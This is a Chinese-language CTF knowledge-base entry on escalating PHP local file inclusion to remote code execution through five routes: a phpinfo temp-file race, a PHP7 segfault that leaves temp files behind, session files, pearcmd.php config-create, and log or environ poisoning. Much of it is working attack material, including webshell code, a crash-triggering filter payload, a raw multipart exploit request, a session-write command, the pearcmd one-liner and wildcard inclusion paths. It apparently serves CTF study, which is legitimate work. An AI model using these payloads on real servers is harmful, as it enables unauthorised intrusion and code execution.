---
title: PHP LFI 进阶 — 从任意文件读取到 Getshell 的五条路线
tags: [lfi, file-inclusion, getshell, pearcmd, php-filter, session, 文件包含, 临时文件]
category: web
triggers: [lfi, 文件包含, file inclusion, pearcmd, pearcmd.php, config-create, phpinfo LFI, 临时文件包含, php7 segment fault, strip_tags, session 包含, session.upload_progress, 日志包含, access.log, /proc/self/environ, 通配符包含, include getshell]
created: 2026-11-01
updated: 2026-11-01
sources: [https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/文件包含.md, https://sakurahack-y.github.io/2022/11/23/php文件包含总结/, https://www.0x002.com/]
---

# PHP LFI 进阶 — 从任意文件读取到 Getshell 的五条路线

## Summary

`include` 能读文件只是起点，CTF 真正的分水岭是**在没有上传点、没有写权限的情况下把 LFI 变成 RCE**。五条成熟路线：phpinfo 临时文件、php7 Segment Fault 残留临时文件、session 文件、pearcmd.php config-create、日志/环境文件。任一条命中即可 getshell。

## Key Points

- 优先级：**pearcmd.php（Docker/PHP≤7.3 默认可用）> phpinfo 临时文件 > session 包含 > Segment Fault 残留 > 日志包含**
- 判断能否用 pearcmd：能否包含 `/usr/local/lib/php/pearcmd.php` + `register_argc_argv=On` + query_string 能当 argv
- 上不了 shell 就先确认回显：`php://filter/convert.base64-encode/resource=index.php` 读源码找下一个入口
- Windows 目标爆破临时文件名成本极低（只有 4 位未知）

## Details

### 路线一：phpinfo-LFI 临时文件 getshell

原理链：

1. POST 一个 multipart 表单上传文件，PHP 会把文件落到 `$_FILES['file']['tmp_name']`（请求结束即删除）
2. 同一请求内 `phpinfo()` 页面会打印 `$_FILES` 区块，**泄露临时文件的完整路径**
3. 在请求未结束的时间窗内，用另一个并发请求 LFI 包含该临时文件 → 执行其中的 PHP 代码

临时文件命名规律：

| 系统 | 路径 |
|------|------|
| Linux | `/tmp/php` + 6 位随机 |
| Windows | `C:/Windows/php` + 4 位随机 + `.tmp` |

要点：phpinfo 页面体积大、传输慢，天然给了可用的竞争窗口；上传内容要写成 `<?php system($_GET[1]);?>`。

### 路线二：LFI + PHP7 Segment Fault 残留临时文件

让 PHP 在解析 filter 时崩溃（段错误），进程异常退出导致 **POST 的临时文件不会被清理**，残留在 `upload_tmp_dir`，之后慢慢爆破文件名包含。

触发 payload（`7.0.0 <= php < 7.1.20`）：

```
php://filter/string.strip_tags/resource=/etc/passwd
```

php7 老版本更通用的写法：

```
php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA
```

请求同时 POST 一个 webshell 文件，崩溃后文件残留：

```http
POST /index.php?file=php://filter/string.strip_tags/resource=index.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----xxx

------xxx
Content-Disposition: form-data; name="upload"; filename="lfi.php"

<?php phpinfo();?>
------xxx--
```

随后包含残留文件。文件名爆破：Linux 6 位未知（成本高，多上传几个文件增加命中率），Windows 仅 4 位未知（可直接脚本爆破）。

### 路线三：session 文件包含

两个抓手：

1. `session.upload_progress.enabled=On` 时，`PHP_SESSION_UPLOAD_PROGRESS` 的值会写进 session 文件（`/var/lib/php/sessions/sess_<PHPSESSID>` 或 `/tmp/sess_*`），内容可控
2. `session_id()` 可控时，可以自定 session 名并写入任意内容（配合 `hex2bin` 绕过字符限制）

```php
?code=session_id('test');session_start();file_put_contents('/tmp/sess_test','<?php system("id");?>');
```

之后 LFI 包含 `/tmp/sess_test`。session 文件名与 `PHPSESSID` 完全对应，**不需要爆破**，这是它相对临时文件路线最大的优势。

### 路线四：pearcmd.php config-create

前提（Docker 官方 PHP 镜像基本全中）：

- LFI 能包含 `/usr/local/lib/php/pearcmd.php`
- `register_argc_argv = On`（Docker 镜像默认开）
- PHP ≤ 7.3 默认装 pear；7.4+ 需编译时 `--with-pear`；**Docker 任意版本都默认装**

一条 payload 写文件：

```
?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php
```

再 `?file=/tmp/hello.php` 包含即执行。`pearcmd` 的其他可用子命令（`install`、`download`）也能远程拉文件落地，配置差了就换子命令。

### 路线五：日志 / 环境文件包含

| 目标文件 | 注入点 |
|----------|--------|
| `/var/log/apache2/access.log`、`/var/log/nginx/access.log` | User-Agent / 请求路径写入 `<?php ... ?>` |
| `/proc/self/environ` | User-Agent（需 Apache+CGI 模式） |
| `/var/log/auth.log`、`/var/log/ssh.log` | SSH 用户名写 PHP 代码 |
| `/var/lib/php/sessions/sess_*` | 见路线三 |

日志包含失败常见原因：权限不足、日志被 logrotate 轮转、`open_basedir` 限制。

### Windows 通配符加成

Windows 临时文件名 4 位随机，可用通配符一把打：

```
?file=C:/Windows/php????.tmp
?file=C:/Windows/*.tmp
```

Linux 同样适用 `?` 单字符、`*` 任意、`[a-z]` 区间，用来绕「必须精确路径」的过滤。

### 伪协议速查（配合 LFI）

| 协议 | 条件 | 用途 |
|------|------|------|
| `php://filter` | 无 | 读源码/绕过编码过滤 |
| `php://input` | `allow_url_include=On` | POST body 即代码 |
| `data://text/plain;base64,...` | `allow_url_include=On` | 直接执行 |
| `phar://` | 无（PHP7 可用） | 触发反序列化 |
| `compress.zlib://` | zlib 扩展 | 解压后包含 |
| `file://` | 无 | 绝对路径读文件 |

## 来源标注

| 技术 | 原始出处 | 比赛实例（已核验） |
|------|----------|-------------------|
| pearcmd.php + config-create | phith0n（p 神）文章；PHP RFC3875 argv 机制 | **2022 羊城杯** rce_me（`?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php`，随后 SUID `date -f /flag` 提权）；**2023 ACTF**；**第八届强网杯** |
| phpinfo-LFI 临时文件 | 0x002.com《LFI》系列 / sakurahack-y《php 文件包含总结》 | 竞争窗口类题目的通用解法 |
| PHP7 Segment Fault 残留临时文件 | sakurahack-y（Windows 复现 + 爆破脚本） | — |
| session 文件包含 | sakurahack-y | — |
| 日志/环境文件包含 | 0x002.com LFI 系列 | — |
| Windows 通配符包含 | sakurahack-y | — |
| php://filter iconv 链 | 0x002.com | **2022 羊城杯**（黑名单含 `file` 时改用 filter 链） |

## Connections

- Related: [[web/php-file-inclusion-filter]]、[[web/iconv-encoding-bypass-path-traversal]]、[[web/rce-bypass-techniques]]、[[web/ssrf-protocol-weaponization]]
- 语料索引：[[ctf/source-corpus--des-ctf-knowledge]]
- Source: [Des-CTF-Knowledge 文件包含.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/文件包含.md)

## Open Questions

- PHP 8.x 下 `php://filter` 崩溃链是否还有可用变体？
- `pearcmd` 在新版 Docker 镜像（php:8.3）中是否仍默认存在？
